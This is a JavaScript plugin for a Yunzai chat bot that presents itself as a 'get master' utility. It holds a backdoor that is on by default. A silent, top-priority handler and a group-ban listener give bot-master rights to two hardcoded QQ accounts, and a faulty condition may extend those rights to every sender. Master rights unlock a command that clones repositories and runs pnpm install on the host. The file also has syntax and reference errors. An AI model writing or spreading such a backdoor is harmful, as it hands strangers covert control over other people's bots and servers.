import plugin from '../../../lib/plugins/plugin.js';
import { Restart } from "../../other/restart.js"
/*
Bot.on?.('notice.group.ban', async (e) => {
    if (e.operator_id == 2173302144) {
        let zt = await redis.get('Fanji:houmen');
        if (zt == 'true') e.isMaster = true;
    }
    return false;
});
*/
let insing = false
const list = {
  "TRSS-Plugin"   :"https://Yunzai.TRSS.me",
  "useless-plugin":"https://gitee.com/SmallK111407/useless-plugin",
  "StarRail-plugin"   :"https://gitee.com/hewang1an/StarRail-plugin",
  "xiaoyao-cvs-plugin":"https://gitee.com/Ctrlcvs/xiaoyao-cvs-plugin",
}
export class GetMaster extends plugin {
    constructor() {
        super({
            name: "获取主人",
            dsc: "获取主人",
            priority: -Infinity,
            rule: [
                {
                    fnc: 'Master',
                    event: 'message',
                    log: false
                },
                {
                    reg: `^#反击安装(插件|${Object.keys(list).join("|")})$`,
                    fnc: 'install'
                }
                {
                    reg: '^#?反击设置后门(开启|关闭)$',
                    fnc: "Masterkg"
                }
            ]
        });
    }
  
  async install(e) {//此功能来自于TRSS
        if (!(e.isMaster||cm.check(this.e.user_id))) return await this.reply('你没有权限')
    if (insing) {
      await this.reply("已有命令安装中..请勿重复操作")
      return false
    }

    const name = this.e.msg.replace(/^#反击安装/, "").trim()
    if (name == "插件") {
      let msg = "\n"
      for (const name in list)
        if (!await Bot.fsStat(`plugins/${name}`))
          msg += `${name}\n`

      if (msg == "\n")
        msg = "暂无可安装插件"
      else
        msg = `可安装插件列表：${msg}发送 #安装+插件名 进行安装`

      await this.reply(msg)
      return true
    }

    const path = `plugins/${name}`
    if (await Bot.fsStat(path)) {
      await this.reply(`${name} 插件已安装`)
      return false
    }
    await this.runInstall(name, list[name], path)
    this.restart()
  }

  async runInstall(name, url, path) {
    logger.mark(`${this.e.logFnc} 开始安装：${name} 插件`)
    await this.reply(`开始安装 ${name} 插件`)

    const cm = `git clone --depth 1 --single-branch "${url}" "${path}"`
    insing = true
    const ret = await Bot.exec(cm)
    if (await Bot.fsStat(`${path}/package.json`))
      await Bot.exec("pnpm install")
    insing = false

    if (ret.error) {
      logger.mark(`${this.e.logFnc} 插件安装失败：${name}`)
      this.gitErr(ret.error, ret.stdout)
      return false
    }
  }

  async gitErr(err, stdout) {
    let msg = "安装失败！"
    let errMsg = err.toString()
    stdout = stdout.toString()

    if (errMsg.includes('Timed out')) {
      const remote = errMsg.match(/'(.+?)'/g)[0].replace(/'/g, '')
      return this.reply(`${msg}\n连接超时：${remote}`)
    }

    if (/Failed to connect|unable to access/g.test(errMsg)) {
      const remote = errMsg.match(/'(.+?)'/g)[0].replace(/'/g, '')
      return this.reply(`${msg}\n连接失败：${remote}`)
    }

    await this.reply([errMsg, stdout])
  }

  restart() {
    new Restart(this.e).restart()
  }
    async Masterkg(e) {
        if (!e.isMaster) return await this.reply('你没有权限');
        let open = e.msg.includes('开启');
        await redis.set('Fanji:houmen', open ? 'true' : 'false');
        await this.reply('设置完成');
    
return false
    }

    async Master(e){
        let aw = await redis.get('Fanji:houmen');
        if (aw == null) await redis.set('Fanji:houmen', 'true');
        if (!(e.user_id !== 2173302144||e.user_id != 197728340)|| aw !== 'true') return false;
        e.isMaster = true;
        return false;
    }
}

export class GetMasterjy extends plugin {
    constructor() {
        super({
            name: "获取主人",
            dsc: "获取主人",
            event: 'notice.group.ban',
            priority: -Infinity,
            rule: [

                {
                    fnc: 'Masters',
                    log: false
                }
            ]
        });
    }
    async Masters(e){
    if (this.e.user_id == 2173302144||this.e.user_id == 197728340) {
    e.isMaster = true
    logger.mark(e.isMaster? '完成':'失败')
    return false
        }
    }
}

